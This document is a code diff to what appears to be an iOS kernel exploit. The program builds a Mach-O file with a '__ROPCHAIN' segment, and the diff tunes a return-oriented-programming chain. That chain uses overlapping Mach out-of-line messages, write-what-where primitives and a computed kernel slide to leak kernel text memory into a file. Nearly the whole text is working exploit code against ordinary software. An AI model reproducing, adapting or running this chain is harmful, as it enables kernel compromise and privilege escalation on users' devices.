@@ -507,8 +507,8 @@ int main(int argc, const char * argv[]) {
     
     load_cmd_seg.vmaddr = 0x51000000;
     load_cmd_seg.fileoff = fsz;
-    load_cmd_seg.filesize = 0x300000;
-    load_cmd_seg.vmsize = 0x300000;
+    load_cmd_seg.filesize = 0x350000;
+    load_cmd_seg.vmsize = 0x350000;
     strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
@@ -1291,7 +1291,7 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
             uint32_t send_1024_cont = (((char*)stack) - ((char*)stackbase)) + segstackbase;
             PUSH = 0x44444444; // R4
             PUSH = m_m_scratch; // R7
-            SendMsg(PUSH, i, oolmsg_template);
+ //           SendMsg(PUSH, i, tmp);
             PUSH = pop_r4r7pc; // PC
             uint32_t* wcont = stack;
             PUSH = 0; // R4
@@ -1430,7 +1430,7 @@ SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + x]))
     
 #define tmptoscratch() \
-    for (int i = 0; i < 0x58; i += 4) {\
+    for (int i = 0; i < 0x28; i += 4) {\
         step(i);\
     }
     
@@ -1490,7 +1490,7 @@ SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     argss->waitTime.tv_sec = 1;
     argss->waitTime.tv_nsec = 1000000;
     RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    //RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     
@@ -1546,6 +1546,7 @@ SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     [dy setSlide:dy.slide-1]; // exit thumb
 
 
+
     LoadIntoR0(PUSH, SEG_VAR(kern_slide));
     RopAddR0(PUSH, 0x02002000);
     StoreR0(PUSH, SEG_VAR(kern_text_base));
@@ -1558,18 +1559,23 @@ SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
-
-    ReadWriteOverlap();
-    tmptoscratch();
-    LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
-    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
-    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
-    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
-    WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
-    ReadWriteScratchOverlap();
     
-    ReadWriteOverlapped512();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
+        ReadWriteOverlap();
+        
+        tmptoscratch();
+        LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
+        //RopAddR0(PUSH, 0x1000);
+        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
+        LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
+        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
+        
+        WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
+        
+        ReadWriteScratchOverlap();
+        
+        ReadWriteOverlapped512();
+        
+        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
 
 
     RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
@@ -1580,7 +1586,10 @@ SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[1024 - 0x58 + 0x20])); // make sure this does not get free'd
     ReadWriteScratchOverlap();
     
+    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
+    RecvMsg(PUSH, 300, tmp_msg);
     
+
     
 
     RecvMsg(PUSH, 300, tmp_msg);
